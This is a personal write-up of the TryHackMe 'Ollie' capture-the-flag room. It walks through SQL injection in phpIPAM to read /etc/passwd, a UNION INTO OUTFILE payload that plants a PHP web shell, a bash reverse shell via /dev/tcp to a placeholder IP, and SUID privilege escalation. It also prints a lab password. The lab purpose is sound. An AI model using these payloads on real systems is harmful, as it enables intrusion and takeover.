---
created: 2026-03-02
tags:
  - note
  - journal
  - cyberStuff
title: ollie
draft: false
date:
subiect:
dificultate: 1
amuca: false
link:
lastmod: 2026-03-02T13:27:59.746Z
---
link : <https://tryhackme.com/room/ollie>\
desc:![](https://share.note.sx/files/ql/ql8lw920aq696buvxt3t.png)

lets run port scan\
![](https://share.note.sx/files/3q/3qkcil8pdxsz86gz744g.png)

pretty clasic but also something interesting is open , the waste service\
lets google it\
![](https://share.note.sx/files/sv/svbq80ilbuki4am8eyri.png)\
ok ok interesting

lets check also the web server\
![](https://share.note.sx/files/yn/ynua0c37ckvu3b235a0e.jpg)\
a simple login page , that i allready find an exploit for , looking in the button of the page\
<https://www.exploit-db.com/exploits/50963>\
the exploit

i runned it and it requires an user and a password\
![](https://share.note.sx/files/jp/jpf96pwpb6ubapj82fr9.png)

i connect to the waste service via nc then i obtained a password and an username\
![](https://share.note.sx/files/cb/cbzg4u4mpa8isoeskfe0.jpg)\
i used the m to login in to the site\
![](https://share.note.sx/files/oj/ojwyy5d2c5jc7wjrkbup.jpg)

lets run also a subdomain enumeration\
![](https://share.note.sx/files/bf/bfj82s0prllvxa9t1z8v.jpg)\
ok interesting lets check misc\
![](https://share.note.sx/files/kf/kf4i1u7m5dk044t0jiqa.png)\
ok ok nice\
![](https://share.note.sx/files/hm/hmm2y5xmr91mc74ke12w.png)\
somthing interesting to investigate\
![](https://share.note.sx/files/dh/dhb1hc7x6sswxxx5zfhm.png)

in those document we can see something interesting about sql injections , lets search something phpipam with sql injections

so lets go to the main panel\
![](https://share.note.sx/files/lw/lwvypkcexzjz8u20mzw8.jpg)\
go to all tools in the center\
![](https://share.note.sx/files/vh/vhzzqrfl1ueagyme46gj.jpg)\
here select routing\
![](https://share.note.sx/files/23/238q13yzp4fuivm1r40y.jpg)\
click on this is the one\
![](https://share.note.sx/files/ca/capylh39ssud00b2ipwz.jpg)\
click the action , select subnet mapping\
![](https://share.note.sx/files/5p/5pig6iz0ho0lx4q6kh7n.jpg)\
and in the map new subnet insert the following string `" union select @@version,2,user(),4 -- -` to perform an sql injection\
![](https://share.note.sx/files/1n/1nbynv9wq14a8m0aw5yo.png)\
and we do find something

i opened burbsuite with interceptor to try to execute an sql injection

![](https://share.note.sx/files/9a/9azkqyio5411id1ilg9a.jpg)\
go again in the same spot and lets intercept the string\
![](https://share.note.sx/files/v7/v7i0sl1l5u8iibn2lm8s.jpg)

put the same string in\
![](https://share.note.sx/files/ky/kyto8l7beisl4gx5n50y.png)\
send it to repeater\
![](https://share.note.sx/files/ra/raxvhqx9gjnv9cdv4sui.png)

![](https://share.note.sx/files/t9/t9195u8boq1ox8xoaiec.png)

here select and use 'CTRL + SHIFT + U ' to url decode

![](https://share.note.sx/files/2b/2bamf2zvtheu3geimfb5.png)

insert the following string and select like in the picture to execute an sql injection\
to \*\*url encode press 'ctrl+u'\
it should look like that\
![](https://share.note.sx/files/1l/1l3qxfz6nrr3dd87gjaw.png)\
and per per patamin we have paswd file

![](https://share.note.sx/files/7v/7vy8w9bdsm39n16xlmdw.png)

`'root:x:0:0:root:/root:/bin/bash`\
`daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin`\
`bin:x:2:2:bin:/bin:/usr/sbin/nologin`\
`sys:x:3:3:sys:/dev:/usr/sbin/nologin`\
`sync:x:4:65534:sync:/bin:/bin/sync`\
`games:x:5:60:games:/usr/games:/usr/sbin/nologin`\
`man:x:6:12:man:/var/cache/man:/usr/sbin/nologin`\
`lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin`\
`mail:x:8:8:mail:/var/mail:/usr/sbin/nologin`\
`news:x:9:9:news:/var/spool/news:/usr/sbin/nologin`\
`uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin`\
`proxy:x:13:13:proxy:/bin:/usr/sbin/nologin`\
`www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`\
`backup:x:34:34:backup:/var/backups:/usr/sbin/nologin`\
`list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin`\
`irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin`\
`gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin`\
`nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin`\
`systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin`\
`systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/3 (4)'`

i also decided to edit a lil bit the file we want to read and put something else there\
![](https://share.note.sx/files/du/duoosbvk36jr9qyhk23o.png)\
and we get the document root\
![](https://share.note.sx/files/l4/l49rmwckdgvau5u0e6bu.png)

ok but i cant effect the sistem any way like that , so lets try something else\
![](https://share.note.sx/files/d1/d1ek3p0yhkijd19587zv.png)\
here i created another instancer for the repeater where i will try to write php files\
subnet="+union+select+(select ''),2,3,4+--+-\&bgp\_id=1\
i used the following string

so make the following selection\
![](https://share.note.sx/files/ar/arue1wfugciw0xj5ekch.png)\
click ctrl + u to url encode\
it should look like that after\
![](https://share.note.sx/files/gh/gheki9e73o36k8cysybr.png)\
send it and we should get something like that\
![](https://share.note.sx/files/r5/r5yo54krccdryz3v8jzw.png)\
is an error but is good

lets try something else\
insert the followng string then make the following selection to url encode\
![](https://share.note.sx/files/wu/wur465m6pu7uy8iu9da4.png)\
it should look something like that\
`subnet="+union+select+("<?php+system($_REQUEST['rse'])%3b+%3f>"),2,3,4+into+outfile'/var/www/html/rse.php'--+-&bgp_id=1`

here is the string if u need it

again a good error\
![](https://share.note.sx/files/ua/uamtyaj3bzf3y4bvgxht.png)\
and if we acces the page we see that we have remote acces\
![](https://share.note.sx/files/v9/v9fvmselknw2nyryx6dt.png)

very nice , now lets try to get a revers shell, open a port to listen\
![](https://share.note.sx/files/s5/s5uuxzgp8c0ma5e9xj5i.png)

in another terminal exicute this `curl 'http://SITEIP/rse.php' --data-urlencode "rse=bash -c 'bash -i >& /dev/tcp/YUORIP/1234 0>&1'"`

![](https://share.note.sx/files/vr/vr1l8hnquw9cas42981w.png)\
and boom ee have an reverse shell

now we can upgrade the shell ![](https://share.note.sx/files/8k/8kxvdr4mi9crhfgs49yi.png)\
ctrl z to background\
![](https://share.note.sx/files/et/etbt7txavs69lihtsbug.png)

to bring back the shell\
![](https://share.note.sx/files/lm/lmm280go8w44ne9dcshl.png)\
![](https://share.note.sx/files/fh/fhajjmgiyxd83qiy4xfj.png)\
to upgrade the shell , this will make it a lot easier to work with the shell

pass:OllieUnixMontgomery!

if we list the user we can find olli , and i tried the password from the 1337 port and it worked\
![](https://share.note.sx/files/2l/2l5fmo0par5e1c6hhluf.png)\
and if we ls we find the user flag\
now i will make a ssh conection betwen us two\
![](https://share.note.sx/files/zw/zwy1kkyvzpraovsignog.jpg)![](https://share.note.sx/files/b5/b5wv5hpfphpzjnri1fab.png)\
and we ssh now\
v![](https://share.note.sx/files/ge/ge4mqk31szj5ntgpkoit.png)\
i alos opened an python server\
![](https://share.note.sx/files/5b/5bf8erg5vivni9iua2p0.png)\
and we gonna use pspy64 to get it\
i downloaded pspy 64 from this link :<https://github.com/DominicBreuker/pspy?tab=readme-ov-file>\
![](https://share.note.sx/files/cq/cqyu7c89b4yqe0wd2z1v.png)

and used wget with a python server to get it\
change the chmod +x and run it ![](https://share.note.sx/files/vv/vv5dhd211bxlkkf7c5oc.png)

running the script we se an interesting file\
![](https://share.note.sx/files/fg/fgyxnugiwsntb9kp23lw.png)\
the feedme file , lets check it out\
we can locate it in /usr/bin/feedme\
what i did here is to write chmod u+s /bin/bash to upgrade the bash\
![](https://share.note.sx/files/x2/x2p5japvkj0egs1h1d4s.png)

and boom\
![](https://share.note.sx/files/np/np5ktg0ywmdqkkgu6stm.png)\
we are the root\
![](https://share.note.sx/files/tp/tpi31as77umv08x8349y.png)\
and boom the flag
